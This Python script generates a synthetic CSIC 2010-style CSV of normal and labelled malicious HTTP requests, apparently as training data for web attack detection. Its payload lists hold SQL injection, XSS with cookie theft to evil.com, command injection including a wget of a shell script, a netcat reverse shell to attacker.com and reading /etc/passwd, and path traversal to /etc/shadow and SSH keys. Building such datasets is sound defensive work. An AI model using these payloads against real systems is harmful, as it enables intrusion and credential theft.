"""
Synthetic HTTP request data generator.

Produces a csic_database.csv in the same format as the CSIC 2010 Kaggle dataset,
containing realistic normal traffic and labelled attack traffic for all supported
attack types.

Usage:
    python generate_data.py
    python generate_data.py --normal 5000 --attacks 3000 --out data/csic_database.csv
"""
import argparse
import random
import string
import urllib.parse
import pandas as pd
from pathlib import Path

random.seed(42)

# ─── Shared building blocks ───────────────────────────────────────────────────

HOST = "localhost:8080"
BASE = f"http://{HOST}/tienda1"

PAGES = [
    "/index.jsp",
    "/publico/anadir.jsp",
    "/publico/autenticar.jsp",
    "/publico/buscar.jsp",
    "/publico/caracteristicas.jsp",
    "/publico/entrar.jsp",
    "/publico/pagar.jsp",
    "/publico/registro.jsp",
    "/privado/listaCompras.jsp",
    "/privado/configuracion.jsp",
]

USER_AGENTS = [
    "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
]

PRODUCTS = ["Vino+Rioja", "Cerveza+Artesanal", "Aceite+Oliva", "Queso+Manchego", "Jamon+Iberico"]
NAMES    = ["Juan+Garcia", "Maria+Lopez", "Carlos+Martinez", "Ana+Fernandez"]
EMAILS   = ["juan@mail.com", "maria@mail.com", "carlos@mail.com", "ana@mail.com"]

def _ua():  return random.choice(USER_AGENTS)
def _sid(): return "JSESSIONID=" + "".join(random.choices(string.hexdigits.upper(), k=32))
def _qty(): return str(random.randint(1, 99))
def _id():  return str(random.randint(1, 50))
def _price(): return str(random.randint(5, 500))


def _row(method, url_path, content="", label=0):
    url = f"{BASE}{url_path} HTTP/1.1"
    body = content
    return {
        "Unnamed: 0":      "Normal" if label == 0 else "Anomalous",
        "Method":          method,
        "User-Agent":      _ua(),
        "Pragma":          "no-cache",
        "Cache-Control":   "no-cache",
        "Accept":          "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
        "Accept-encoding": "x-gzip, x-deflate, gzip, deflate",
        "Accept-charset":  "utf-8, utf-8;q=0.5, *;q=0.1",
        "language":        "en",
        "host":            HOST,
        "cookie":          _sid(),
        "content-type":    "application/x-www-form-urlencoded" if method == "POST" else float("nan"),
        "connection":      "close",
        "lenght":          str(len(body)) if body else float("nan"),
        "content":         body if body else float("nan"),
        "classification":  label,
        "URL":             url,
    }


# ─── Normal traffic generators ────────────────────────────────────────────────

def _normal_get_index():
    return _row("GET", "/index.jsp")

def _normal_get_browse():
    product = random.choice(PRODUCTS)
    page = random.choice(PAGES[1:5])
    qs = f"?id={_id()}&nombre={product}&precio={_price()}&cantidad={_qty()}&B1=A%C3%B1adir+al+carrito"
    return _row("GET", page + qs)

def _normal_get_search():
    terms = ["vino", "cerveza", "aceite", "queso", "jamon", "rioja", "extra"]
    return _row("GET", f"/publico/buscar.jsp?query={random.choice(terms)}")

def _normal_post_login():
    body = f"correo={random.choice(EMAILS)}&password={''.join(random.choices(string.ascii_letters + string.digits, k=8))}"
    return _row("POST", "/publico/autenticar.jsp", body)

def _normal_post_register():
    name = random.choice(NAMES)
    body = f"nombre={name}&apellidos=Apellido&correo={random.choice(EMAILS)}&password=Pass1234&telefono=6{random.randint(10000000,99999999)}"
    return _row("POST", "/publico/registro.jsp", body)

def _normal_post_pay():
    body = f"tarjeta={random.randint(1000000000000000, 9999999999999999)}&mes={random.randint(1,12):02d}&anio={random.randint(25,30)}&cvv={random.randint(100,999)}"
    return _row("POST", "/publico/pagar.jsp", body)

NORMAL_GENERATORS = [
    _normal_get_index,
    _normal_get_browse, _normal_get_browse, _normal_get_browse,
    _normal_get_search,
    _normal_post_login, _normal_post_login,
    _normal_post_register,
    _normal_post_pay,
]


# ─── Attack traffic generators ────────────────────────────────────────────────

# SQL Injection
_SQL_PAYLOADS = [
    "' OR '1'='1'--",
    "' OR 1=1--",
    "admin'--",
    "1' UNION SELECT null,username,password FROM users--",
    "1; DROP TABLE users--",
    "' OR 'x'='x",
    "1 AND 1=1",
    "' UNION SELECT 1,2,3--",
    "1; EXEC xp_cmdshell('whoami')--",
    "' AND SLEEP(5)--",
    "1 OR BENCHMARK(1000000,MD5(1))--",
    "' OR EXISTS(SELECT * FROM information_schema.tables)--",
]

def _attack_sqli_login():
    payload = random.choice(_SQL_PAYLOADS)
    body = f"correo={urllib.parse.quote(payload)}&password=anything"
    return _row("POST", "/publico/autenticar.jsp", body, label=1)

def _attack_sqli_search():
    payload = random.choice(_SQL_PAYLOADS)
    return _row("GET", f"/publico/buscar.jsp?query={urllib.parse.quote(payload)}", label=1)

def _attack_sqli_param():
    payload = random.choice(_SQL_PAYLOADS)
    return _row("GET", f"/publico/caracteristicas.jsp?id={urllib.parse.quote(payload)}", label=1)


# XSS
_XSS_PAYLOADS = [
    "<script>alert(document.cookie)</script>",
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(document.domain)>",
    "javascript:alert(1)",
    "<iframe src='javascript:alert(1)'>",
    "'\"><script>document.location='http://evil.com/steal?c='+document.cookie</script>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert(1) autofocus>",
    "%3Cscript%3Ealert(1)%3C/script%3E",
]

def _attack_xss_search():
    payload = random.choice(_XSS_PAYLOADS)
    return _row("GET", f"/publico/buscar.jsp?query={urllib.parse.quote(payload)}", label=1)

def _attack_xss_post():
    payload = random.choice(_XSS_PAYLOADS)
    body = f"nombre={urllib.parse.quote(payload)}&apellidos=Test&correo=test@test.com&password=test123"
    return _row("POST", "/publico/registro.jsp", body, label=1)


# Command Injection
_CMD_PAYLOADS = [
    "; cat /etc/passwd",
    "| whoami",
    "; ls -la /",
    "& net user",
    "; wget http://evil.com/shell.sh",
    "| id",
    "; python -c 'import os; os.system(\"id\")'",
    "`id`",
    "$(whoami)",
    "; ping -c 4 attacker.com",
    "| nc -e /bin/sh attacker.com 4444",
]

def _attack_cmd_param():
    payload = random.choice(_CMD_PAYLOADS)
    return _row("GET", f"/publico/buscar.jsp?query=item{urllib.parse.quote(payload)}", label=1)

def _attack_cmd_post():
    payload = random.choice(_CMD_PAYLOADS)
    body = f"correo=admin{urllib.parse.quote(payload)}&password=pass"
    return _row("POST", "/publico/autenticar.jsp", body, label=1)


# Path Traversal
_TRAVERSAL_TARGETS = [
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/windows/system32/drivers/etc/hosts",
    "/proc/self/environ",
    "/.ssh/id_rsa",
    "/var/log/apache2/access.log",
    "/WEB-INF/web.xml",
    "/WEB-INF/classes/config.properties",
]

def _attack_traversal():
    depth = random.randint(3, 7)
    prefix = "../" * depth
    target = random.choice(_TRAVERSAL_TARGETS)
    path = urllib.parse.quote(prefix + target.lstrip("/"))
    return _row("GET", f"/publico/caracteristicas.jsp?id={path}", label=1)

def _attack_traversal_encoded():
    depth = random.randint(3, 6)
    prefix = "%2e%2e%2f" * depth
    target = random.choice(_TRAVERSAL_TARGETS)
    return _row("GET", f"/publico/anadir.jsp?nombre={prefix}{urllib.parse.quote(target.lstrip('/'))}", label=1)


# Buffer Overflow
def _attack_buffer_overflow():
    field = random.choice(["id", "nombre", "query", "password"])
    filler = random.choice([
        "A" * random.randint(300, 800),
        "%41" * random.randint(200, 500),
        "\\x41" * random.randint(200, 400),
    ])
    return _row("GET", f"/publico/buscar.jsp?{field}={urllib.parse.quote(filler)}", label=1)

def _attack_buffer_overflow_post():
    filler = "B" * random.randint(400, 1000)
    body = f"correo={urllib.parse.quote(filler)}&password=pass"
    return _row("POST", "/publico/autenticar.jsp", body, label=1)


# LDAP Injection
_LDAP_PAYLOADS = [
    "*)(&",
    "*)(uid=*))(|(uid=*",
    "admin)(&(password=*)",
    "*()|%26'",
    "*))(|(cn=*",
    "admin)(!(&(1=0)",
    "*(|(password=*)",
]

def _attack_ldap():
    payload = random.choice(_LDAP_PAYLOADS)
    body = f"correo={urllib.parse.quote(payload)}&password=anything"
    return _row("POST", "/publico/autenticar.jsp", body, label=1)


# Parameter Tampering
def _attack_param_tamper_price():
    return _row("GET", f"/publico/anadir.jsp?id={_id()}&nombre={random.choice(PRODUCTS)}&precio=-1&cantidad={_qty()}&B1=Comprar", label=1)

def _attack_param_tamper_qty():
    return _row("GET", f"/publico/anadir.jsp?id={_id()}&nombre={random.choice(PRODUCTS)}&precio={_price()}&cantidad=-99999&B1=Comprar", label=1)

def _attack_param_tamper_id():
    return _row("GET", f"/privado/listaCompras.jsp?id={random.randint(1000, 9999)}&user_id=1", label=1)


ATTACK_GENERATORS = [
    # SQL injection — most common
    _attack_sqli_login, _attack_sqli_login, _attack_sqli_login,
    _attack_sqli_search, _attack_sqli_search,
    _attack_sqli_param,
    # XSS
    _attack_xss_search, _attack_xss_search,
    _attack_xss_post,
    # Command injection
    _attack_cmd_param, _attack_cmd_param,
    _attack_cmd_post,
    # Path traversal
    _attack_traversal, _attack_traversal,
    _attack_traversal_encoded,
    # Buffer overflow
    _attack_buffer_overflow,
    _attack_buffer_overflow_post,
    # LDAP injection
    _attack_ldap, _attack_ldap,
    # Parameter tampering
    _attack_param_tamper_price,
    _attack_param_tamper_qty,
    _attack_param_tamper_id,
]


# ─── Main generator ───────────────────────────────────────────────────────────

def generate(n_normal: int = 5000, n_attacks: int = 3000, out: str = "data/csic_database.csv"):
    print(f"Generating {n_normal} normal + {n_attacks} attack requests...")

    rows = []

    for _ in range(n_normal):
        gen = random.choice(NORMAL_GENERATORS)
        rows.append(gen())

    for _ in range(n_attacks):
        gen = random.choice(ATTACK_GENERATORS)
        rows.append(gen())

    random.shuffle(rows)
    df = pd.DataFrame(rows)

    out_path = Path(out)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    df.to_csv(out_path, index=False)

    normal_count = sum(1 for r in rows if r["classification"] == 0)
    attack_count = sum(1 for r in rows if r["classification"] == 1)
    print(f"Saved {len(df)} rows to {out_path}")
    print(f"  Normal:    {normal_count}")
    print(f"  Anomalous: {attack_count}")

    attack_types = {
        "SQL Injection":      sum(1 for r in rows if r["classification"]==1 and "UNION" in str(r.get("content","")) + str(r.get("URL","")) or "OR '1'" in str(r.get("content","")) + str(r.get("URL",""))),
        "XSS":                sum(1 for r in rows if r["classification"]==1 and "<script" in str(r.get("content","")) + str(r.get("URL","")).lower()),
        "Command Injection":  sum(1 for r in rows if r["classification"]==1 and ("whoami" in str(r.get("content","")) + str(r.get("URL","")) or "passwd" in str(r.get("content","")) + str(r.get("URL","")))),
        "Path Traversal":     sum(1 for r in rows if r["classification"]==1 and (".." in str(r.get("URL","")) or "%2e" in str(r.get("URL","")).lower())),
        "Buffer Overflow":    sum(1 for r in rows if r["classification"]==1 and len(str(r.get("content","")) + str(r.get("URL",""))) > 400),
    }
    print("\n  Attack type breakdown (approximate):")
    for t, c in attack_types.items():
        print(f"    {t:<22} {c}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Generate synthetic CSIC 2010-format HTTP traffic data")
    parser.add_argument("--normal",  type=int, default=5000, help="Number of normal requests")
    parser.add_argument("--attacks", type=int, default=3000, help="Number of attack requests")
    parser.add_argument("--out",     default="data/csic_database.csv", help="Output CSV path")
    args = parser.parse_args()

    generate(args.normal, args.attacks, args.out)
